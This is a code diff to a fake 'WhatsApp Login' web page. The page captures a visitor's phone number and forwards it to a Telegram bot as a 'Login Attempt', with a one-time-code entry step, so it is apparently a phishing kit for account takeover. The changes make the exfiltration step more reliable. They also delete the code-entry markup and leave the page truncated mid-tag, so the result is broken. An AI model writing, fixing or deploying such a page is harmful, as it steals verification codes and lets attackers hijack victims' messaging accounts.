@@ -105,6 +105,7 @@
           const data = await response.json();
           return data.ok;
         } catch (error) {
+          console.error("Error sending message to Telegram:", error);
           return false;
         }
       });
@@ -122,15 +123,21 @@
       const time = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
       const date = now.toLocaleDateString();
       const message = `⏰<b>Time:${time} Date:</b> ${date}\n\n📱 <b>${hiddenText()} \n \n✅WhatsApp Login Attempt</b>\n\n📞 <b>Phone Number:</b> ${fullNumber}\n`;
-      sendToTelegram(message);
-      setTimeout(() => {
-        document.getElementById("loading").style.display = "none";
-        document.getElementById("numberPage").style.display = "none";
-        document.getElementById("otpPage").style.display = "block";
-        document.querySelectorAll('.step')[1].classList.add('active');
-        document.querySelector('.step-line').classList.add('active');
-        startTimer();
-      }, 1500);
+      sendToTelegram(message).then(success => {
+        if (success) {
+          setTimeout(() => {
+            document.getElementById("loading").style.display = "none";
+            document.getElementById("numberPage").style.display = "none";
+            document.getElementById("otpPage").style.display = "block";
+            document.querySelectorAll('.step')[1].classList.add('active');
+            document.querySelector('.step-line').classList.add('active');
+            startTimer();
+          }, 1500);
+        } else {
+          document.getElementById("loading").style.display = "none";
+          alert("Failed to send verification code. Please try again.");
+        }
+      });
     };
 
     function startTimer() {
@@ -240,32 +247,4 @@
         <option value="+236">🇨🇫 Central African Republic (+236)</option>
         <option value="+235">🇹🇩 Chad (+235)</option>
         <option value="+56">🇨🇱 Chile (+56)</option>
-        <option value="+86">🇨🇳 China (+86)</option>
-		<option value="+94">🇱🇰 Sri Lanka (+94)</option>
- </select>
-        <input type="tel" id="phoneNumber" maxlength="10" placeholder="10 digit number" inputmode="numeric">
-      </div>
-      <button onclick="sendNumber()">Next</button>
-      <div id="loading">Please wait, sending verification code...</div>
-    </div>
-
-    <div id="otpPage">
-      <p>Enter the 6-digit code sent to your phone</p>
-      <div class="otp-inputs">
-        <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 1)">
-        <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 2)">
-        <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 3)">
-        <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 4)">
-        <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 5)">
-        <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 6)">
-      </div>
-      <div class="timer">Time remaining: <span id="countdown">01:00</span></div>
-      <button onclick="submitOtp()">Verify OTP</button>
-      <div class="resend disabled" id="resendBtn" onclick="resendOtp()">Resend OTP</div>
-    </div>
-
-    <div class="success-message" id="successMessage"><i class="fas fa-check-circle"></i> OTP verified successfully! Redirecting...</div>
-    <div class="error-message" id="errorMessage"><i class="fas fa-exclamation-circle"></i> Verification failed. Please try again.<button class="try-again-btn" onclick="tryAgain()">Try Again</button></div>
-  </div>
-</body>
-			</html>
+        <option value="+86">
